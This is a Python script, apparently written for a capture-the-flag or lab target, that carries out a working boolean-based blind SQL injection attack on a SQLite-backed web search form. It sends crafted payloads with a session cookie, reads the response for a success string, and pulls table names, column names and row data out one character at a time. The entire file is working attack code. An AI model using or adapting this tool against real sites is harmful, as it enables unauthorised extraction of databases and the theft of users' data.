import requests
import sys
import curses

if len(sys.argv) < 2:
    print("Error! Invalid args supplied")
    print("Usage: python SQLi.py <site> ")

host = sys.argv[1]

#stdscr = curses.initscr()
#curses.noecho()
#curses.cbreak()

s = requests.Session()

count = 0
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_. "

tableQuery = "1 and (SELECT hex(substr(tbl_name, {}, 1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset {}) = hex('{}')"

columnQuery = "1 and (SELECT hex(substr(name, {}, 1)) FROM PRAGMA_TABLE_INFO('{}') limit 1 offset {}) = hex('{}')"

dataQuery = "1 and (SELECT hex(substr({}, {}, 1)) FROM {} limit 1 offset {}) = hex('{}')"

extracted = ""
offset = 1
tableOffset = 0
columnOffset = 0
dataOffset = 0
stage = 0

dbInfo = {}
tableName = ""
columnName = ""

reqCount = 0
reqData = {"search":""}
cookies = {"access_token_cookie":""}

def buildQuery():
    global tableQuery
    global columnQuery
    global dataQuery
    global reqData
    global reqCount
    global cookies
    global offset
    global tableOffset
    global columnOffset
    global dataOffset
    global extracted
    global stage

    while 1:
        hasChanged = False
        for char in charset:
            #stdscr.addstr(0, 0, ("Data extracted: %s" % extracted))
            #stdscr.addstr(1, 0, ("Testing: %s" % char))
            #stdscr.refresh()

            if stage == 0:
                testQuery = tableQuery.format(offset, tableOffset, char)
            elif stage == 1:
                testQuery = columnQuery.format(offset, tableName, columnOffset, char)
            else:
                testQuery = dataQuery.format(columnName, offset, tableName, dataOffset, char)

            reqData["search"] = testQuery
            r = s.post(host, data=reqData, cookies=cookies)
            reqCount += 1
            if "Results found for ID" in r.text:
                offset += 1
                extracted += char
                hasChanged = True
                break

        if not hasChanged:
            offset = 1
            
            if extracted == "":
                if stage == 0:
                    tableOffset = 0
                    updateNames()
                    stage += 1
                    print(dbInfo)
                    continue
                elif stage == 1:
                    columnOffset = 0
                    updateNames()
                    tableOffset += 1
                    if tableOffset == len(dbInfo):
                        stage += 1
                        tableOffset = 0
                        columnOffset = 0
                        updateNames()
                    print(dbInfo)
                    continue
                elif stage == 2:
                    updateNames()
                    if tableName == "activity":
                        print(dbInfo)
                        sys.exit(1)
                    columnOffset += 1
                    dataOffset = 0
                    if columnOffset == len(dbInfo[list(dbInfo.keys())[tableOffset]]):
                        if tableOffset == len(dbInfo):
                            break
                        tableOffset += 1
                        columnOffset = 0
                    #print(dbInfo)
                    continue
            
            if stage == 0:
                tableOffset += 1
                dbInfo[extracted] = {}
                print("Table", tableOffset, ":", extracted)
            elif stage == 1:
                columnOffset += 1
                dbInfo[tableName][extracted] = []
                updateNames()
                print("Column", columnOffset, ":", extracted)
            elif stage == 2:
                dataOffset += 1
                dbInfo[tableName][columnName].append(extracted)
                updateNames()
                print("Data", dataOffset, ":", extracted)
            else:
                print(dbInfo)
                break
    
            extracted = ""
        

def updateNames():
    global tableName
    global columnName
    global tableOffset
    global columnOffset
   
    #print(dbInfo)
    if stage >= 0:
        tableName = list(dbInfo.keys())[tableOffset]
    if stage > 1:
        columnName = list(dbInfo[tableName].keys())[columnOffset]
    #print(stage, tableName, columnName)

if __name__ == "__main__":
    try:
        buildQuery()
    finally:
        pass
        #curses.echo()
        #curses.nocbreak()
        #curses.endwin()

